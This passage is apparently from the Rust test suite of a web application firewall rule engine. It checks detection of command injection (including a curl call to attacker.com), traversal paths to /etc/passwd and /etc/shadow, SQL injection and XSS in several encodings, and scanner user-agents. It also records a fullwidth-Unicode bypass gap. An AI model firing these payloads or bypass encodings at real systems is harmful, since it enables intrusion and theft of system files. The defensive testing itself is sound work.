        let payloads = ["$(whoami)", "$(cat /etc/passwd)", "$(curl attacker.com)"];
        for p in &payloads {
            let req = req_builder().body(p).build();
            assert!(evaluate_rule(&rule, &req), "subshell RCE: '{}'", p);
        }
    }

    // ── LFI / Path Traversal ──────────────────────────────────

    #[test]
    fn pentest_lfi_path_traversal() {
        let rule = make_rule(
            "p030",
            "path",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"\.\./").unwrap()),
        );
        let payloads = [
            "/../../../etc/passwd",
            "/api/../../../../etc/shadow",
            "/static/../../../etc/hosts",
        ];
        for p in &payloads {
            let req = req_builder().path(p).build();
            assert!(evaluate_rule(&rule, &req), "LFI: '{}'", p);
        }
    }

    #[test]
    fn pentest_lfi_etc_passwd() {
        let rule = make_rule(
            "p031",
            "path",
            MatchOperator::Contains,
            CompiledValue::String("/etc/passwd".into()),
        );
        let payloads = ["/../../../etc/passwd", "/api/v1/../../etc/passwd"];
        for p in &payloads {
            let req = req_builder().path(p).build();
            assert!(evaluate_rule(&rule, &req), "/etc/passwd LFI: '{}'", p);
        }
    }

    // ── Scanner Detection ─────────────────────────────────────

    #[test]
    fn pentest_scanner_useragent() {
        let yaml = r#"
id: "p040"
name: "Scanner UA"
phase: request_headers
match:
  any:
    - field: headers.user-agent
      operator: pm
      value: ["sqlmap", "nikto", "nmap", "burpsuite"]
action: anomaly
anomaly_score: 10
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let rule = compile_rule(raw).unwrap();
        let scanners = ["sqlmap/1.8", "nikto/2.5", "nmap", "BurpSuite/2024"];
        for ua in &scanners {
            let mut h = AHashMap::new();
            h.insert("user-agent".into(), ua.to_string());
            let req = RequestData {
                method: "GET".into(),
                path: "/".into(),
                query: "".into(),
                headers: h,
                body: "".into(),
                cookies: AHashMap::new(),
                args: AHashMap::new(),
            };
            assert!(evaluate_rule(&rule, &req), "Scanner UA: '{}'", ua);
        }
    }

    // ── Edge Cases ────────────────────────────────────────────

    #[test]
    fn pentest_edge_case_sensitive() {
        let rule = make_rule(
            "p050",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union.*select").unwrap()),
        );
        let req = req_builder().body("UNION SELECT 1").build();
        assert!(evaluate_rule(&rule, &req), "case insensitive UNION SELECT");

        let req2 = req_builder().body("union select 1").build();
        assert!(evaluate_rule(&rule, &req2), "lowercase union select");
    }

    #[test]
    fn pentest_edge_benign_should_not_match() {
        let rule = make_rule(
            "p060",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union.*select").unwrap()),
        );
        let req = req_builder()
            .body("university selected the candidate")
            .build();
        assert!(
            !evaluate_rule(&rule, &req),
            "benign text should not match union select"
        );
    }

    #[test]
    fn pentest_edge_no_false_positive_on_method() {
        let yaml = r#"
id: "p061"
name: "POST to login"
phase: request_headers
match:
  all:
    - field: method
      operator: equals
      value: "POST"
    - field: path
      operator: rx
      value: "(?i)(login|signin)"
action: anomaly
anomaly_score: 5
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let rule = compile_rule(raw).unwrap();

        // GET ke login should NOT match (cuma POST)
        let get_req = req_builder().method("GET").path("/login").build();
        assert!(
            !evaluate_rule(&rule, &get_req),
            "GET /login should not trigger login rule"
        );

        // POST ke login should match
        let post_req = req_builder().method("POST").path("/login").build();
        assert!(
            evaluate_rule(&rule, &post_req),
            "POST /login should trigger login rule"
        );
    }

    #[test]
    fn pentest_batch_yaml_from_file() {
        // Load the actual rules/custom-rules.yaml
        let path = std::path::Path::new("rules/custom-rules.yaml");
        if !path.exists() {
            eprintln!("SKIP: rules/custom-rules.yaml not found in cwd");
            return;
        }
        let rules = load_rules_from_yaml(path).unwrap();
        assert_eq!(
            rules.len(),
            10,
            "should load 10 rules from custom-rules.yaml"
        );

        // Verify SQLi rule catches a UNION payload
        let req = req_builder().body("1 UNION SELECT * FROM users").build();
        let sqli_rules: Vec<_> = rules.iter().filter(|r| r.id == "100001").collect();
        assert!(!sqli_rules.is_empty(), "rule 100001 should exist");
        assert!(
            evaluate_rule(sqli_rules[0], &req),
            "100001 should catch UNION SELECT"
        );

        // Verify scanner rule is disabled
        let scanner_rules: Vec<_> = rules.iter().filter(|r| r.id == "100010").collect();
        assert!(!scanner_rules.is_empty(), "rule 100010 should exist");
        assert!(
            !scanner_rules[0].enabled,
            "100010 should be disabled by default"
        );
    }

    #[test]
    fn pentest_dsl_file_from_disk() {
        // Load the actual .jwaf file
        let path = std::path::Path::new("rules/advanced-rules.jwaf");
        if !path.exists() {
            eprintln!("SKIP: rules/advanced-rules.jwaf not found in cwd");
            return;
        }
        let content = std::fs::read_to_string(path).unwrap();
        let rules = crate::rule_engine::dsl::parse_jwaf_rules(&content).unwrap();
        assert_eq!(
            rules.len(),
            5,
            "should load 5 rules from advanced-rules.jwaf"
        );

        // Verify rule IDs
        let ids: Vec<_> = rules.iter().map(|r| r.id.as_str()).collect();
        assert!(ids.contains(&"J001"), "J001 SQLi");
        assert!(ids.contains(&"J002"), "J002 XSS");
        assert!(ids.contains(&"J005"), "J005 Admin");

        // Verify a block rule works
        let rule = rules.iter().find(|r| r.id == "J001").unwrap();
        let req = req_builder().body("1 UNION SELECT 1").build();
        assert!(evaluate_rule(rule, &req), "J001 should match UNION SELECT");

        // J005 uses all logic — path must match AND method must equal GET
        let rule5 = rules.iter().find(|r| r.id == "J005").unwrap();
        assert_eq!(rule5.logic, MatchLogic::All);
        let admin_get = req_builder().method("GET").path("/admin").build();
        assert!(
            evaluate_rule(rule5, &admin_get),
            "J005 should match GET /admin"
        );
        let admin_post = req_builder().method("POST").path("/admin").build();
        assert!(
            !evaluate_rule(rule5, &admin_post),
            "J005 should NOT match POST /admin"
        );
    }

    #[test]
    fn pentest_args_vs_body_isolation() {
        // Rule cuma untuk body
        let rule = make_rule(
            "p070",
            "body",
            MatchOperator::Contains,
            CompiledValue::String("' OR '".into()),
        );
        let req = req_builder()
            .args("q", "' OR '1'='1")
            .body("hello world")
            .build();
        // body gak contain payload → should not match
        assert!(
            !evaluate_rule(&rule, &req),
            "body-only rule should not match args"
        );
    }

    #[test]
    fn pentest_custom_rule_action_anomaly() {
        let yaml = r#"
id: "p080"
name: "Anomaly Scoring Test"
phase: request_headers
match:
  any:
    - field: path
      operator: rx
      value: "(?i)(admin|config|backup)"
action: anomaly
anomaly_score: 20
enabled: true
"#;
        let raw: RawRule = serde_yaml::from_str(yaml).unwrap();
        let rule = compile_rule(raw).unwrap();
        assert_eq!(rule.action, RuleAction::Anomaly);
        assert_eq!(rule.anomaly_score, 20);

        let req = req_builder().path("/admin").build();
        assert!(
            evaluate_rule(&rule, &req),
            "anomaly rule should match /admin"
        );

        let req2 = req_builder().path("/public").build();
        assert!(
            !evaluate_rule(&rule, &req2),
            "anomaly rule should NOT match /public"
        );
    }

    // ── Transform Tests ──────────────────────────────────────

    #[test]
    fn test_transform_url_decode_catches_encoded_sqli() {
        // Rule with UrlDecode transform catches URL-encoded UNION SELECT
        let rule = CompiledRule {
            id: "t001".into(),
            name: "Transform test".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 1,
            tags: vec![],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::UrlDecode],
        };

        // URL-encoded payload: %55%4e%49%4f%4e%20%53%45%4c%45%43%54
        // which decodes to "UNION SELECT"
        let req = req_builder()
            .body("%55%4e%49%4f%4e%20%53%45%4c%45%43%54")
            .build();
        assert!(
            evaluate_rule(&rule, &req),
            "UrlDecode should catch encoded UNION SELECT"
        );
    }

    #[test]
    fn test_transform_normalize_path() {
        let rule = CompiledRule {
            id: "t002".into(),
            name: "Path normalize".into(),
            phase: Phase::RequestHeaders,
            severity: Severity::High,
            paranoia: 1,
            tags: vec![],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "path".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"/admin").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 30,
            enabled: true,
            transforms: vec![Transform::NormalizePath],
        };

        // Obfuscated: /public/../admin/./config
        // Normalized: /admin/config
        let req = req_builder().path("/public/../admin/./config").build();
        assert!(
            evaluate_rule(&rule, &req),
            "NormalizePath should catch /public/../admin"
        );
    }

    #[test]
    fn test_transform_html_entity_xss() {
        let rule = CompiledRule {
            id: "t003".into(),
            name: "HTML entity XSS".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 1,
            tags: vec!["xss".into()],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"(?i)<script[^>]*>").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::HtmlEntityDecode],
        };

        // HTML-encoded: &lt;script&gt;alert(1)&lt;/script&gt;
        let req = req_builder()
            .body("&lt;script&gt;alert(1)&lt;/script&gt;")
            .build();
        assert!(
            evaluate_rule(&rule, &req),
            "HtmlEntityDecode should catch encoded &lt;script&gt;"
        );
    }

    #[test]
    fn test_transform_lowercase_catches_upper() {
        let rule = CompiledRule {
            id: "t004".into(),
            name: "Lowercase transform".into(),
            phase: Phase::RequestHeaders,
            severity: Severity::Medium,
            paranoia: 1,
            tags: vec![],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "headers.user-agent".into(),
                operator: MatchOperator::Pm,
                compiled_value: CompiledValue::StringList(vec!["sqlmap".into()]),
                negate: false,
            }],
            action: RuleAction::Anomaly,
            anomaly_score: 10,
            enabled: true,
            transforms: vec![Transform::Lowercase],
        };

        let req = req_builder().header("user-agent", "SQLMAP/1.0").build();
        assert!(
            evaluate_rule(&rule, &req),
            "Lowercase transform should match SQLMAP"
        );
    }

    #[test]
    fn test_transform_no_transforms_still_works() {
        // Backward compat: empty transforms = raw value match
        let rule = make_rule(
            "t005",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"union").unwrap()),
        );
        let req = req_builder().body("union select").build();
        assert!(evaluate_rule(&rule, &req), "no-transforms rule still works");
    }

    #[test]
    fn test_apply_transforms_pipeline() {
        // Apply UrlDecode + Lowercase + RemoveNulls
        let input = "%55%6e%49%6f%4e%00%53%45%4c";
        let result = apply_transforms(
            input,
            &[
                Transform::UrlDecode,
                Transform::Lowercase,
                Transform::RemoveNulls,
            ],
        );
        assert_eq!(result, "unionsel");
    }

    // ── Final Pentest — Encoded/Obfuscated Payloads ──────────

    #[test]
    fn pentest_double_url_encoded_sqli() {
        // Payload: %2535%2535%2534... (double-encoded UNION SELECT)
        // After UrlDecode: %55%4e%49%4f%4e -> "UNION" (need a second decode)
        let rule = CompiledRule {
            id: "p900".into(),
            name: "Double-url-encoded SQLi".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 3,
            tags: vec!["sqli".into(), "encoding".into()],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::UrlDecode, Transform::UrlDecode],
        };
        // Double-encoded: %2535 = %25 = %, %35 = 5
        // %25%35%35 => %%35%35 => after first decode: %55
        // after second decode: U
        // So "UNION SELECT" double-encoded
        let payload = "%25%35%35%25%34%65%25%34%39%25%34%66%25%34%65%25%32%30%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34";
        let req = req_builder().body(payload).build();
        assert!(
            evaluate_rule(&rule, &req),
            "Double-url-decode should catch double-encoded UNION SELECT"
        );
    }

    #[test]
    fn pentest_unicode_normalize_sqli() {
        // Wide chars / unicode confusables: ＵＮＩＯＮ ＳＥＬＥＣＴ
        // (fullwidth U+FF35 U+FF2E...)
        // Raw regex won't match because these are different code points
        // But with NormalizePath + Lowercase, no transform handles this yet
        // This documents the gap — we'd need Unicode NFKC normalization
        let rule = make_rule(
            "p901",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
        );
        let req = req_builder()
            .body("\u{ff35}\u{ff2e}\u{ff29}\u{ff2f}\u{ff2e}\u{ff33}\u{ff25}\u{ff2c}\u{ff25}\u{ff23}\u{ff34}")
            .build();
        assert!(
            !evaluate_rule(&rule, &req),
            "Fullwidth chars bypass raw regex (documented gap)"
        );
    }

    #[test]
    fn pentest_raw_payload_vs_transformed() {
        // Rule without transform should miss URL-encoded
        let rule_raw = make_rule(
            "p910",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
        );
        let rule_with_transform = CompiledRule {
            id: "p911".into(),
            name: "URL-decode SQLi".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 1,
            tags: vec![],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::UrlDecode],
        };

        let req = req_builder().body("UNION%20SELECT%201").build();

        // Raw rule fails
        assert!(
            !evaluate_rule(&rule_raw, &req),
            "Raw rule should MISS url-encoded"
        );
        // Transformed rule catches it
        assert!(
            evaluate_rule(&rule_with_transform, &req),
            "Transform rule should CATCH url-encoded"
        );
    }

    #[test]
    fn pentest_null_byte_bypass() {
        // Null byte injection: SEL\0ECT
        let rule = CompiledRule {
            id: "p920".into(),
            name: "Null-byte SQLi".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 2,
            tags: vec!["sqli".into()],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::RemoveNulls],
        };

        // "UNION SELECT" with null byte between "SELECT" chars
        // regex won't match because \0 breaks the pattern
        // After RemoveNulls: "UNION SELECT" matches
        let _req = req_builder().body("UNION%20SELE\0CT%201").build();

        // But wait, this is raw text with \0, not URL-encoded %00
        // Let's use actual null byte
        let mut body = "UNION SELE".to_string();
        body.push('\0');
        body.push_str("CT 1");
        let req2 = req_builder().body(&body).build();
        assert!(
            evaluate_rule(&rule, &req2),
            "RemoveNulls should catch null-byte obfuscated SELECT"
        );

        // Without transform, null byte bypasses
        let rule_raw = make_rule(
            "p921",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)union\s+select").unwrap()),
        );
        assert!(
            !evaluate_rule(&rule_raw, &req2),
            "Without RemoveNulls, null byte bypasses regex"
        );
    }

    #[test]
    fn pentest_encoded_path_traversal() {
        // URL-encoded: %2e%2e%2f = ../
        let rule = CompiledRule {
            id: "p930".into(),
            name: "URL-encoded path traversal".into(),
            phase: Phase::RequestHeaders,
            severity: Severity::High,
            paranoia: 1,
            tags: vec!["lfi".into(), "path-traversal".into()],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "path".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"\.\./").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::UrlDecode],
        };

        // Without decode, .%2e/ won't match ../ regex
        let req_encoded = req_builder().path("/public/.%2e/private").build();
        assert!(
            evaluate_rule(&rule, &req_encoded),
            "UrlDecode transform should catch .%2e/"
        );

        // Without transform
        let rule_raw = make_rule(
            "p931",
            "path",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"\.\./").unwrap()),
        );
        assert!(
            !evaluate_rule(&rule_raw, &req_encoded),
            "Without UrlDecode, .%2e/ bypasses"
        );
    }

    #[test]
    fn pentest_base64_encoded_payload() {
        // Base64: "dW5pb24gc2VsZWN0" = "union select"
        let rule = CompiledRule {
            id: "p940".into(),
            name: "Base64 detection".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 4,
            tags: vec!["sqli".into(), "base64".into()],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(
                    Regex::new(r"(?i)union\s+select|(?i)ORIG_B64").unwrap(),
                ),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 75,
            enabled: true,
            transforms: vec![Transform::Base64Decode],
        };

        let req = req_builder().body("dW5pb24gc2VsZWN0").build();
        assert!(
            evaluate_rule(&rule, &req),
            "Base64Decode + ORIG_B64 pattern should catch base64 UNION SELECT"
        );
    }

    #[test]
    fn pentest_html_entity_xss_secondpass() {
        // &lt;img src=x onerror=alert(1)&gt;
        let rule = CompiledRule {
            id: "p950".into(),
            name: "HTML entity XSS (img)".into(),
            phase: Phase::RequestBody,
            severity: Severity::Critical,
            paranoia: 2,
            tags: vec!["xss".into()],
            logic: MatchLogic::Any,
            conditions: vec![CompiledCondition {
                field: "body".into(),
                operator: MatchOperator::Rx,
                compiled_value: CompiledValue::Regex(Regex::new(r"(?i)<(script|img)\s").unwrap()),
                negate: false,
            }],
            action: RuleAction::Block,
            anomaly_score: 50,
            enabled: true,
            transforms: vec![Transform::HtmlEntityDecode],
        };

        let req = req_builder()
            .body("&lt;img src=x onerror=alert(1)&gt;")
            .build();
        assert!(
            evaluate_rule(&rule, &req),
            "HtmlEntityDecode should catch &lt;img&gt;"
        );

        let rule_raw = make_rule(
            "p951",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"(?i)<(script|img)\s").unwrap()),
        );
        assert!(
            !evaluate_rule(&rule_raw, &req),
            "Without HtmlEntityDecode, encoded XSS bypasses"
        );
    }

    #[test]
    fn pentest_eval_cache_hit() {
        // Verify cache works for identical requests
        let rule = make_rule(
            "p960",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"union").unwrap()),
        );
        let req = req_builder().body("union select").build();

        // First call — uncached
        let r1 = evaluate_rule_cached(&rule, &req);
        assert!(r1, "first eval should match");

        // Second call — cache hit
        let r2 = evaluate_rule_cached(&rule, &req);
        assert!(r2, "cached eval should still match");
    }

    #[test]
    fn pentest_cache_miss_different_body() {
        // Different body should produce different cache entry
        let rule = make_rule(
            "p961",
            "body",
            MatchOperator::Rx,
            CompiledValue::Regex(Regex::new(r"union").unwrap()),
        );
        let req1 = req_builder().body("union select").build();
        let req2 = req_builder().body("drop table").build();

        assert!(evaluate_rule_cached(&rule, &req1), "req1 should match");
        assert!(
            !evaluate_rule_cached(&rule, &req2),
            "req2 should NOT match (different cache entry)"
        );
    }
}
